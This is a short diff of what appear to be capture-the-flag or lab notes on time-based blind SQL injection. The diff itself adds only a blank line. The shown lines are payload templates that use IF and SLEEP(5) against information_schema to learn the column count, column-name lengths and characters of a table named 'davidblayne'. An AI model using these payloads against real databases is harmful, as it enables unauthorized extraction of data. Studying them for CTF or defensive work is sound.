@@ -114,6 +114,7 @@ Find number of columns and their names:
 IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'davidblayne' AND table_schema=database()) = X, SLEEP(5), 0)
 
 IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='davidblayne' AND table_schema=database() LIMIT X, 1)) = X, SLEEP(5), 0)
+
 IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='davidblayne' LIMIT X, 1), X, 1) = 'X', SLEEP(5), 0)
 ```
 
